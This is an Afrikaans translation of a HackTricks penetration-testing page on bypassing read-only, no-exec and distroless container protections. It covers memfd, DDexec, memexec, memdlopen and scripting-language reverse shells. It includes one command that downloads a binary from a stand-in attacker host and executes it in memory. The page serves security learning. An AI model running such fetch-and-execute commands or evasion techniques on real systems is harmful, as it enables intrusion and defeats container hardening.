# Bypass FS beskerming: lees-slegs / geen-uitvoer / Distroless

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

As jy belangstel in 'n **hacking-loopbaan** en die onhackbare wil hack - **ons is aan die aanstel!** (_vloeiende Pools geskrewe en gespreek vereis_).

{% embed url="https://www.stmcyber.com/careers" %}

## Videos

In die volgende videos kan jy die tegnieke wat op hierdie bladsy genoem word, meer diepgaand verduidelik vind:

* [**DEF CON 31 - Verkenning van Linux-geheue-manipulasie vir Steek en Ontwyking**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Stiekeme indringings met DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## lees-slegs / geen-uitvoer scenario

Dit word al hoe meer algemeen om Linux-masjiene te vind wat met **lees-slegs (ro) lêerstelselbeskerming** gemonteer is, veral in houers. Dit is omdat dit maklik is om 'n houer met 'n ro lêerstelsel te hardloop deur **`readOnlyRootFilesystem: true`** in die `securitycontext` in te stel:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Nietemin, selfs as die lêerstelsel as ro gemonteer is, sal **`/dev/shm`** steeds skryfbaar wees, so dit is vals dat ons niks op die skyf kan skryf nie. Hierdie vouer sal egter **gemonteer word met geen-uitvoerbeskerming**, so as jy 'n binêre lêer hier aflaai, **sal jy dit nie kan uitvoer nie**.

{% hint style="warning" %}
Vanuit 'n rooi span-perspektief maak dit dit **ingewikkeld om binêre lêers af te laai en uit te voer** wat nie reeds in die stelsel is nie (soos agterdeure of enumereerders soos `kubectl`).
{% endhint %}

## Maklikste omseiling: Skripte

Let daarop dat ek van binêre lêers gepraat het, jy kan **enige skrip uitvoer** solank die tolk binne die masjien is, soos 'n **skulpskrip** as `sh` teenwoordig is of 'n **python-skrip** as `python` geïnstalleer is.

Nietemin is dit nie net genoeg om jou binêre agterdeur of ander binêre gereedskap wat jy mag nodig hê, uit te voer nie.

## Geheue-omseilings

As jy 'n binêre lêer wil uitvoer maar die lêerstelsel dit nie toelaat nie, is die beste manier om dit te doen deur dit vanaf die geheue uit te voer, aangesien die **beskerming nie daarop van toepassing is nie**.

### FD + exec-systeemafronding

As jy kragtige skripskryfmasjiene binne die masjien het, soos **Python**, **Perl**, of **Ruby**, kan jy die binêre lêer aflaai om vanaf die geheue uit te voer, dit in 'n geheue-lêerbeskrywer stoor (`create_memfd`-systeemafronding), wat nie deur daardie beskerming beskerm gaan word nie, en dan 'n **`exec`-systeemafronding** aanroep wat die **fd as die lêer om uit te voer** aandui.

Hiervoor kan jy maklik die projek [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) gebruik. Jy kan dit 'n binêre lêer deurgee en dit sal 'n skrip in die aangeduide taal genereer met die **binêre lêer saamgedruk en b64-gekodeer** met die instruksies om dit te **dekodeer en te ontspan** in 'n **fd** wat geskep is deur die `create_memfd`-systeemafronding en 'n oproep na die **exec**-systeemafronding om dit uit te voer.

{% hint style="warning" %}
Dit werk nie in ander skripskryftale soos PHP of Node nie omdat hulle geen **standaard manier het om rou systeemafrondings** vanuit 'n skrip te roep nie, sodat dit nie moontlik is om `create_memfd` te roep om die **geheue-fd** te skep om die binêre te stoor nie.

Verder sal dit nie werk om 'n **gewone fd** met 'n lêer in `/dev/shm` te skep nie, omdat jy nie toegelaat sal word om dit uit te voer nie omdat die **geen-uitvoerbeskerming** van toepassing sal wees.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is 'n tegniek wat jou in staat stel om die geheue van jou eie proses te **verander deur sy** **`/proc/self/mem`** te oorskryf.

Daarom kan jy deur die **samestellingskode te beheer** wat deur die proses uitgevoer word, 'n **shellkode** skryf en die proses "muteer" om **enige willekeurige kode** uit te voer.

{% hint style="success" %}
**DDexec / EverythingExec** sal jou in staat stel om jou eie **shellkode** of **enige binêre** vanuit **geheue** te laai en **uit te voer**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Vir meer inligting oor hierdie tegniek, kyk op die Github of:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) is die natuurlike volgende stap van DDexec. Dit is 'n **DDexec shellcode gedemoniseer**, sodat elke keer as jy 'n **verskillende binêre lêer wil hardloop** hoef jy nie DDexec weer te begin nie, jy kan net memexec shellcode hardloop via die DDexec tegniek en dan **met hierdie duiwel kommunikeer om nuwe binêre lêers te stuur om te laai en te hardloop**.

Jy kan 'n voorbeeld vind van hoe om **memexec te gebruik om binêre lêers van 'n PHP omgekeerde dop te hardloop** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Met 'n soortgelyke doel as DDexec, laat die [**memdlopen**](https://github.com/arget13/memdlopen) tegniek 'n **makliker manier toe om binêre lêers in geheue te laai** om hulle later uit te voer. Dit kan selfs toelaat om binêre lêers met afhanklikhede te laai.

## Distroless Omgewing

### Wat is distroless

Distroless houers bevat slegs die **noodsaaklike komponente om 'n spesifieke aansoek of diens te hardloop**, soos biblioteke en tyduitvoeringsafhanklikhede, maar sluit groter komponente uit soos 'n pakkettebestuurder, skul, of stelselnutsprogramme.

Die doel van distroless houers is om die **aanvalsvlak van houers te verminder deur onnodige komponente te elimineer** en die aantal kwesbaarhede wat uitgebuit kan word, te minimeer.

### Omgekeerde Dop

In 'n distroless houer mag jy dalk **nie eers `sh` of `bash`** vind om 'n gewone dop te kry nie. Jy sal ook nie binêre lêers soos `ls`, `whoami`, `id`... vind nie, alles wat jy gewoonlik in 'n stelsel hardloop.

{% hint style="warning" %}
Daarom sal jy **nie** in staat wees om 'n **omgekeerde dop** te kry of die stelsel te **opnoem** soos jy gewoonlik doen nie.
{% endhint %}

Maar as die gekompromitteerde houer byvoorbeeld 'n flask-web hardloop, dan is Python geïnstalleer, en dus kan jy 'n **Python omgekeerde dop** kry. As dit node hardloop, kan jy 'n Node omgekeerde dop kry, en dieselfde met byna enige **skripseltaal**.

{% hint style="success" %}
Deur die skripseltaal te gebruik, kan jy die stelsel **opnoem** deur van die taalvermoëns gebruik te maak.
{% endhint %}

As daar **geen `read-only/no-exec`** beskerming is nie, kan jy jou omgekeerde dop misbruik om **binêre lêers in die lêersisteem te skryf** en hulle **uit te voer**.

{% hint style="success" %}
Tog sal hierdie soort houers gewoonlik hierdie beskermings hê, maar jy kan die **vorige geheue-uitvoeringstegnieke gebruik om dit te omseil**.
{% endhint %}

Jy kan **voorbeelde** vind van hoe om **sekere RCE-kwesbaarhede te misbruik** om skripseltaal **omgekeerde dops** te kry en binêre lêers van geheue uit te voer in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

As jy belangstel in 'n **hakerloopbaan** en die onhakbare wil hak - **ons is aan die aanstel!** (_vloeiende Pools geskrewe en gesproke vereis_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
